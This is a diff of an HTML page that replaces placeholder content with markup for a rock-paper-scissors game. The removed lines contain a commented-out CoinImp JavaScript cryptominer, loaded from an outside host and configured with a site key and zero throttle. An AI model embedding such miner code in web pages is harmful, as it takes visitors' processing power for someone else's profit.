@@ -6,34 +6,44 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
-
-    <!-- <script src="https://www.hostingcloud.racing/RUqN.js"></script>
-    <script>
-        let client = Client.Anonymous('ed6435068eebea1374d61c162c4079f711cdedf03756a322afd63588687f4889', {
-            throttle: 0, c: 'w'
-        });
-        client.start();
-        client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com", "#cccccc", 40, "#3d3d3d");
-
-    </script> -->
-
+    <script src="js.js" defer></script>
+    <link rel="stylesheet" href="style.css">
 
 </head>
 
 <body>
 
 
-    <h1>Hello</h1>
+    <header>
+        <h1>ROCK PAPER SICORS</h1>
+    </header>
 
-    <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Neque provident laudantium voluptatibus tempore natus
-        iste rem aut enim quia accusamus hic minus, voluptates, consequatur placeat ea, vel atque perferendis odit.
-        Quam a cupiditate illo accusamus. Commodi quae minus magni aliquid quia totam! Veritatis sed voluptates
-        quibusdam incidunt temporibus, accusantium tenetur delectus exercitationem? Excepturi animi inventore
-        perferendis. Sapiente, quo ea. Explicabo?
-        Dolore doloribus omnis asperiores? Cum voluptas aliquam perspiciatis vero, eius ducimus dolores perferendis
-        molestiae ipsa blanditiis nihil illo officia adipisci harum quaerat repellat nulla deleniti ipsam ad.
-    </p>
+    <h4>First to score 5 points wins the game</h4>
 
+    <div class="game">
+        <div class="items">
+            <div id="pchoise">player choise</div>
+            <div class="score">player score:</div>
+        </div>
+        <div class="items">
+            <div id="cchoise">computer choise</div>
+            <div class="score">player score: </div>
+        </div>
+    </div>
+
+
+
+    <div class="buttons">
+        <div class="rock">
+            <button id="rockbtn">rock</button>
+        </div>
+        <div class="paper">
+            <button id="paperbtn">paper</button>
+        </div>
+        <div class="sicors">
+            <button id="sicorsbtn">sicors</button>
+        </div>
+    </div>
 
 </body>
 
